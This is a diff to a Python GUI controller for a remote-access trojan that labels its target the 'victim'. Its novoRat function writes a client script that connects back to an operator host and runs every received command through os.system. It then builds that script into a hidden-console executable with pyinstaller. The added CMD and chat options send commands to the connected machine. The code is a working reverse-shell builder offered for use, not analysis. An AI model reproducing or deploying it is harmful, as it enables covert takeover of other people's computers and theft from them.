@@ -2,12 +2,54 @@
 from pathlib import Path
 from PySimpleGUI import PySimpleGUI as sg
 import os
+from subprocess import Popen
 import socket
+import keyboard
+import time
 
 ipPadrao = socket.gethostbyname(socket.gethostname())
 portaPadrao = 8081
-madeBy = 'VBESrat'
+madeBy = 'VBESwinc'
 version = '1.0'
+
+
+####### PÁG INICIAL #######
+
+def inicial(client=None, client_addr=None):
+    sg.theme('SystemDefault')
+    sg.theme_button_color(('black', '#C2FFC2'))
+
+    
+
+    layout = [
+        [sg.Text(madeBy, font="verdana")],
+        [sg.Text('v'+version)],
+        [sg.Text('')],
+        [sg.Text('')],
+        [sg.Text('Features')],
+        [sg.Text('')],
+        [sg.Button('RAT', key='btnRat', size=(10, 1))],
+
+    ]
+
+    
+
+    janela = sg.Window(''+ madeBy +' '+ version, layout, size=(700, 400), finalize=True)
+    
+    
+    
+    while True:
+        
+        eventos, valores = janela.read()
+        
+        if eventos == sg.WINDOW_CLOSED:
+            exit()
+
+        if eventos == 'btnRat':
+            conectado()
+        
+
+
 
 ####### JANELA CONECTAR #########
 
@@ -15,7 +57,7 @@ sg.theme('DarkBlack')
 sg.theme_button_color(('white', '#9700FF'))
 
 
-def init():
+def init(janelaOld):
     layout = [
         [sg.Text('Host')],
         [sg.Input(ipPadrao, key='host')],
@@ -34,7 +76,8 @@ def init():
         if eventos == 'btnConn':
             host = valores['host']
             porta = valores['porta']
-            conectar(host, porta)
+            janelaOld.close()
+            conectar(host, porta, janela)
 
 
 
@@ -42,14 +85,14 @@ def init():
 
 
 ####### SOCKET ##########
-def conectar(host, porta):
-
+def conectar(host, porta, janelaOld):
     porta = int(porta)
     server = socket.socket()
     server.bind((host, porta))
     server.listen(2)
     client, client_addr = server.accept()
     sg.popup("Uma nova conexão foi estabelecida!")
+    janelaOld.close()
     conectado(client, client_addr)
     
                     
@@ -59,22 +102,19 @@ def conectado(client=None, client_addr=None):
 
     menu = [
         ['&RAT', ['&Conectar', '&Novo']],
+        ['&Opções', ['&CMD', '&Chat']],
         ['&Ajuda', ['&GitHub', '&Discord']]
     ]
 
     layout = [
         [sg.Menu(menu, tearoff=False, key='menu')],
         [sg.Text('Conectado com: '+str(client_addr))],
-        [sg.Text('')],
-        [sg.Text('')],
-        [sg.Text('')],
-        [sg.Button('CMD', key='btnCmd', size=(20, 1))],
 
     ]
 
     
 
-    janela = sg.Window(''+ madeBy +' '+ version +' - Conectado', layout, size=(900, 600), finalize=True)
+    janela = sg.Window(''+ madeBy +' '+ version +' - RAT', layout, size=(400, 50), finalize=True)
     
     
     
@@ -83,16 +123,19 @@ def conectado(client=None, client_addr=None):
         eventos, valores = janela.read()
         
         if eventos == sg.WINDOW_CLOSED:
-            exit()
+            break
 
-        if eventos == 'btnCmd':
+        if eventos == 'CMD':
             cmd(client, client_addr, janela)
         
+        if eventos == 'Chat':
+            chat(client, client_addr, janela)
+        
         if eventos == 'Novo':
-            rat(client, client_addr,janela)
+            rat(client, client_addr, janela)
 
         if eventos == 'Conectar':
-            init()
+            init(janela)
 
 
 def rat(client=None, client_addr=None,janela=None):
@@ -128,14 +171,22 @@ def rat(client=None, client_addr=None,janela=None):
 
 def novoRat(host, porta, nome):
     with open(nome + '.py', "w") as arquivo:
-        arquivo.write('import socket\nimport subprocess\nimport os\nHOST=socket.gethostbyname("'+ host +'")\nPORT='+ porta +'\nclient = socket.socket()\nclient.connect((HOST, PORT))\nwhile True:\n    command = client.recv(1024)\n    command = command.decode()\n    os.system(command)')
+        arquivo.write('import socket\nimport subprocess\nimport os\n\nHOST=socket.gethostbyname("'+ host +'")\nPORT='+ porta +'\n\nclient = socket.socket()\nclient.connect((HOST, PORT))\n\nwhile True:\n    command = client.recv(1024)\n    command = command.decode()\n    os.system(command)')
+        command = "pyinstaller --onefile --noconsole "+nome+".py"
+        Popen(command, shell=True)
+        #time.sleep(1)
+        #os.system("start cmd")
+        #time.sleep(1)
+        #keyboard.write("pyinstaller --onefile "+nome+".py")
+        #keyboard.send("enter")
+        sg.popup("Seu RAT será processado!\nEm alguns instantes estará disponível\nNa pasta 'dist' na raíz!")
+      
         
-        conv = "pyinstaller --onefile ./"+ nome +".py"
-        os.system(conv)
-
-        sg.popup("Criado: "+ nome +".exe")
+        
+        
 
 
+#OPCOES RAT#
 def cmd(client, client_addr, janela):
     sg.theme('DarkBlack')
     sg.theme_button_color(('white', '#9700FF'))
@@ -158,6 +209,7 @@ def cmd(client, client_addr, janela):
             conectado(client, client_addr)
         if event == 'btnEnvCmd':
             command = str(val['inpCmd'])
+            command = command +" cmdOpc"
             while True:
                 command = command.encode()
                 client.send(command)
@@ -166,9 +218,40 @@ def cmd(client, client_addr, janela):
                 janela.close()
                 conectado(client, client_addr)
 
+
+def chat(client, client_addr, janela):
+    sg.theme('DarkBlack')
+    sg.theme_button_color(('white', '#9700FF'))
+    
+    layout = [
+        [sg.Text('Chat')],
+        [sg.Text('')],
+        [sg.Button('Iniciar', key='btnEnvCmd')]
+    ]
+
+    janelaCmd = sg.Window(''+ madeBy +' ' + version + ' - Chat', layout, size=(230,150), finalize=True)
+
+    while True:
+        event, val = janelaCmd.read()
+        if event == sg.WIN_CLOSED:
+            janelaCmd.close()
+            janela.close()
+            conectado(client, client_addr)
+        if event == 'btnEnvCmd':
+            janelaCmd.close()
+            janela.close()
+            command = input("Você: ")
+            command = command +" chatOpc"
+            print(command)
+            while command != "quit":
+                command = command.encode()
+                client.send(command)
+                response = client.recv(1024)
+                print("Vítima: "+response)
+
             
     
     
     
     
-conectado()
+inicial()
